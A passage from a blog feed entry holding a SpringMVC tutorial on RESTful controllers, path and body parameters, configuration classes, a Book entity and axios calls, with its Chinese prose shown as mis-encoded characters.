annotation punctuation">@RequestBody</span> <span class="token class-name">User</span> user<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user update..."</span><span class="token operator">+</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"{'module':'user update'}"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//è®¾ç½®å½“å‰è¯·æ±‚æ–¹æ³•ä¸ºGETï¼Œè¡¨ç¤ºRESTé£æ ¼ä¸­çš„æŸ¥è¯¢æ“ä½œ</span>    <span class="token comment">//@PathVariableæ³¨è§£ç”¨äºè®¾ç½®è·¯å¾„å˜é‡ï¼ˆè·¯å¾„å‚æ•°ï¼‰ï¼Œè¦æ±‚è·¯å¾„ä¸Šè®¾ç½®å¯¹åº”çš„å ä½ç¬¦ï¼Œå¹¶ä¸”å ä½ç¬¦åç§°ä¸æ–¹æ³•å½¢å‚åç§°ç›¸åŒ</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/users/{id}"</span> <span class="token punctuation">,</span>method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>GET<span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getById</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">Integer</span> id<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user getById..."</span><span class="token operator">+</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"{'module':'user getById'}"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//è®¾ç½®å½“å‰è¯·æ±‚æ–¹æ³•ä¸ºGETï¼Œè¡¨ç¤ºRESTé£æ ¼ä¸­çš„æŸ¥è¯¢æ“ä½œ</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/users"</span><span class="token punctuation">,</span>method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>GET<span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user getAll..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"{'module':'user getAll'}"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="RequestBody-RequestParam-PathVariableä¸‰è€…å…³ç³»"><a href="#RequestBody-RequestParam-PathVariableä¸‰è€…å…³ç³»" class="headerlink" title="@RequestBody  @RequestParam  @PathVariableä¸‰è€…å…³ç³»"></a>@RequestBody  @RequestParam  @PathVariableä¸‰è€…å…³ç³»</h4><blockquote><ul><li><p>åŒºåˆ«<br> @RequestParamç”¨äºæ¥æ”¶urlåœ°å€ä¼ å‚æˆ–è¡¨å•ä¼ å‚<br> @RequestBodyç”¨äºæ¥æ”¶jsonæ•°æ®<br> @PathVariableç”¨äºæ¥æ”¶è·¯å¾„å‚æ•°ï¼Œä½¿ç”¨{å‚æ•°åç§°}æè¿°è·¯å¾„å‚æ•°</p></li><li><p>åº”ç”¨<br> åæœŸå¼€å‘ä¸­ï¼Œå‘é€è¯·æ±‚å‚æ•°è¶…è¿‡1ä¸ªæ—¶ï¼Œä»¥jsonæ ¼å¼ä¸ºä¸»ï¼Œ@RequestBodyåº”ç”¨è¾ƒå¹¿<br> å¦‚æœå‘é€éjsonæ ¼å¼æ•°æ®ï¼Œé€‰ç”¨@RequestParamæ¥æ”¶è¯·æ±‚å‚æ•°<br> é‡‡ç”¨RESTfulè¿›è¡Œå¼€å‘ï¼Œå½“å‚æ•°æ•°é‡è¾ƒå°‘æ—¶ï¼Œä¾‹å¦‚1ä¸ªï¼Œå¯ä»¥é‡‡ç”¨@PathVariableæ¥æ”¶è¯·æ±‚è·¯å¾„å˜é‡ï¼Œé€šå¸¸ç”¨äºä¼ é€’idå€¼</p></li></ul></blockquote><h4 id="RESTfulå¿«é€Ÿå¼€å‘"><a href="#RESTfulå¿«é€Ÿå¼€å‘" class="headerlink" title="RESTfulå¿«é€Ÿå¼€å‘"></a>RESTfulå¿«é€Ÿå¼€å‘</h4><p>åœ¨ä¸Šè¿°å…¥é—¨æ¡ˆä¾‹ä¸­ï¼Œ</p><p><img src="/SpringMVC%EF%BC%88%E4%BA%8C%EF%BC%89/image-20220405112305607.png"></p><p>è¿™ä¸ªä¸¤ä¸ªéƒ¨åˆ†é‡å¤æ€§å¤ªé«˜ã€‚</p><p>è§£å†³æ–¹æ³•ï¼š</p><ul><li><p>åœ¨Controllerç±»ä¸Šä½¿ç”¨@RequestMappingå®šä¹‰å…±åŒçš„è®¿é—®è·¯å¾„ã€‚</p></li><li><p>ä½¿ç”¨@GetMapping  @PostMapping  @PutMapping  @DeleteMappingä»£æ›¿@RequestMapping(method=RequestMethod.XXX)</p></li><li><p>åœ¨Controllerç±»ä¸Šä½¿ç”¨@RestControlleræ³¨è§£ï¼Œç­‰åŒäº@Controllerä¸@ResponseBodyä¸¤ä¸ªæ³¨è§£ç»„åˆåŠŸèƒ½</p></li></ul><p>ä»£ç ç¤ºä¾‹ï¼š</p><p>åœ¨BookControllerç±»ä¸­</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RestController</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/books"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookController2</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@PostMapping</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">Book</span> book<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book save..."</span> <span class="token operator">+</span> book<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"{'module':'book save'}"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@DeleteMapping</span><span class="token punctuation">(</span><span class="token string">"/{id}"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">Integer</span> id<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book delete..."</span> <span class="token operator">+</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"{'module':'book delete'}"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@PutMapping</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">Book</span> book<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book update..."</span><span class="token operator">+</span>book<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"{'module':'book update'}"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/{id}"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getById</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">Integer</span> id<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book getById..."</span><span class="token operator">+</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"{'module':'book getById'}"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@GetMapping</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book getAll..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"{'module':'book getAll'}"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="RESTfulé¡µé¢æ•°æ®äº¤äº’æ¡ˆä¾‹"><a href="#RESTfulé¡µé¢æ•°æ®äº¤äº’æ¡ˆä¾‹" class="headerlink" title="RESTfulé¡µé¢æ•°æ®äº¤äº’æ¡ˆä¾‹"></a>RESTfulé¡µé¢æ•°æ®äº¤äº’æ¡ˆä¾‹</h4><p>æ²¡æœ‰æ•°æ®æŒä¹…åŒ–å±‚</p><p><img src="/SpringMVC%EF%BC%88%E4%BA%8C%EF%BC%89/image-20220405115525658.png" alt="æ¡ˆä¾‹ç»“æ„"></p><p>Configæ–‡ä»¶å¤¹ä¸‹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletContainersInitConfig</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractAnnotationConfigDispatcherServletInitializer</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getRootConfigClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getServletConfigClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">SpringMvcConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getServletMappings</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//ä¹±ç å¤„ç†</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token class-name">Filter</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getServletFilters</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">CharacterEncodingFilter</span> filter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CharacterEncodingFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        filter<span class="token punctuation">.</span><span class="token function">setEncoding</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Filter</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>filter<span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"com.yang.controller"</span><span class="token punctuation">,</span> <span class="token string">"com.yang.config"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token annotation punctuation">@EnableWebMvc</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringMvcConfig</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringMvcSupport</span> <span class="token keyword">extends</span> <span class="token class-name">WebMvcConfigurationSupport</span> <span class="token punctuation">{</span>    <span class="token comment">//è®¾ç½®é™æ€èµ„æºè®¿é—®è¿‡æ»¤ï¼Œå½“å‰ç±»éœ€è¦è®¾ç½®ä¸ºé…ç½®ç±»ï¼Œå¹¶è¢«æ‰«æåŠ è½½</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">addResourceHandlers</span><span class="token punctuation">(</span><span class="token class-name">ResourceHandlerRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//å½“è®¿é—®/pages/????æ—¶å€™ï¼Œä»/pagesç›®å½•ä¸‹æŸ¥æ‰¾å†…å®¹</span>        registry<span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span><span class="token string">"/pages/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token string">"/pages/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span><span class="token string">"/js/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token string">"/js/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span><span class="token string">"/css/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token string">"/css/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span><span class="token string">"/plugins/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token string">"/plugins/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>BookControllerç±»</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RestController</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/books"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookController</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@PostMapping</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">Book</span> book<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book save ==&gt; "</span><span class="token operator">+</span> book<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"{'module':'book save success'}"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@GetMapping</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Book</span><span class="token punctuation">&gt;</span></span> <span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book getAll is running ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Book</span><span class="token punctuation">&gt;</span></span> bookList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Book</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Book</span> book1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Book</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        book1<span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span><span class="token string">"è®¡ç®—æœº"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        book1<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"æ•°æ®åº“"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        book1<span class="token punctuation">.</span><span class="token function">setDescription</span><span class="token punctuation">(</span><span class="token string">"å°ç‰›"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>book1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Book</span> book2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Book</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        book2<span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span><span class="token string">"è®¡ç®—æœº"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        book2<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"æ“ä½œç³»ç»Ÿ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        book2<span class="token punctuation">.</span><span class="token function">setDescription</span><span class="token punctuation">(</span><span class="token string">"å°é©¬"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>book2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Book</span> book3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Book</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        book3<span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span><span class="token string">"è®¡ç®—æœº"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        book3<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"è®¡ç®—æœºç½‘ç»œ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        book3<span class="token punctuation">.</span><span class="token function">setDescription</span><span class="token punctuation">(</span><span class="token string">"å°é¼ "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>book3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> bookList<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Bookç±»ï¼ˆä¸»è¦æ˜¯è·å–æ•°æ®ï¼‰ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Book</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> id<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> type<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> description<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"Book{"</span> <span class="token operator">+</span>                <span class="token string">"id="</span> <span class="token operator">+</span> id <span class="token operator">+</span>                <span class="token string">", type='"</span> <span class="token operator">+</span> type <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>                <span class="token string">", name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>                <span class="token string">", description='"</span> <span class="token operator">+</span> description <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>                <span class="token char">'}'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> id<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setId</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> id<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> type<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setType</span><span class="token punctuation">(</span><span class="token class-name">String</span> type<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> type<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> description<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setDescription</span><span class="token punctuation">(</span><span class="token class-name">String</span> description<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>description <span class="token operator">=</span> description<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿˜è¦ç”¨åˆ°axiosè¿›è¡Œäº¤äº’</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span>               <span class="token comment">// é‡ç½®è¡¨å•</span>               <span class="token function">resetForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                   <span class="token comment">//æ¸…ç©ºè¾“å…¥æ¡†</span>                   <span class="token keyword">this</span><span class="token punctuation">.</span>formData <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span><span class="token punctuation">,</span>               <span class="token comment">// å¼¹å‡ºæ·»åŠ çª—å£</span>               <span class="token function">openSave</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                   <span class="token keyword">this</span><span class="token punctuation">.</span>dialogFormVisible <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">resetForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span><span class="token punctuation">,</span>               <span class="token comment">//æ·»åŠ </span>               <span class="token function">saveBook</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                   axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/books"</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>formData<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>                   <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span><span class="token punctuation">,</span>               <span class="token comment">//ä¸»é¡µåˆ—è¡¨æŸ¥è¯¢</span>               <span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                   axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/books"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>                       <span class="token keyword">this</span><span class="token punctuation">.</span>dataList <span class="token operator">=</span> res<span class="token punctuation">.</span>data<span class="token punctuation">;</span>                   <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span><span class="token punctuation">,</span>           <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JavaEE </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringMVCï¼ˆä¸€ï¼‰</title>
      <link href="/2022/04/04/springmvc-yi/"/>
      <url>/2022/04/04/springmvc-yi/</url>
      
